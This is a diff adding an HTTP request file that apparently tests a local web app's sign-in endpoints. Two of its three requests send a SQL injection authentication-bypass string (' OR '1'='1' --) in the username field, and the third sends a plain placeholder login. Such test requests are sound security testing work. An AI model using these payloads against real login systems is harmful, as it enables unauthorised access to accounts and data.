@@ -1,0 +1,27 @@
+
+POST http://localhost:3000/api/auth/sign-in
+Content-Type: application/json
+
+{
+	"username": "' OR '1'='1' -- ",
+	"password": "anything"
+}
+
+###
+
+POST http://localhost:3000/api/auth/sign-in-dg
+Content-Type: application/json
+
+{
+  "username": "' OR '1'='1' -- -",
+  "password": "anything"
+}
+###
+POST http://localhost:3000/api/auth/sign-in
+Content-Type: application/json
+
+{
+ "username": "johndoe",
+    "password": "password123"
+}
+###
